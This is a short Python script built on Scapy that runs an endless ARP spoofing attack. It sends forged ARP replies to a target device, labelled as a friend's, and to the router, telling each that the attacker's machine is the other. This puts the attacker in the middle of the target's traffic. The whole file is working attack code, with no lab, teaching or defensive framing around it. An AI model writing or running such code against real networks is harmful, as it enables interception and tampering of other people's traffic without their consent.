from scapy.all import ARP, send
import time

# Spoof the target device and the router
def spoof():
    while True:
        # Send ARP to the target, telling it that your MAC is the router's MAC
        send(ARP(op=2, pdst="192.168.61.232", psrc="192.168.61.197", hwdst="cc:f9:e4:f9:6b:db"))  # Friend's MAC

        # Send ARP to the router, telling it that your MAC is the target's MAC
        send(ARP(op=2, pdst="192.168.61.197", psrc="192.168.61.232", hwdst="9e:56:cc:5d:38:ba"))  # Router's MAC

        time.sleep(1)

# Call the spoof function to start the attack
spoof()

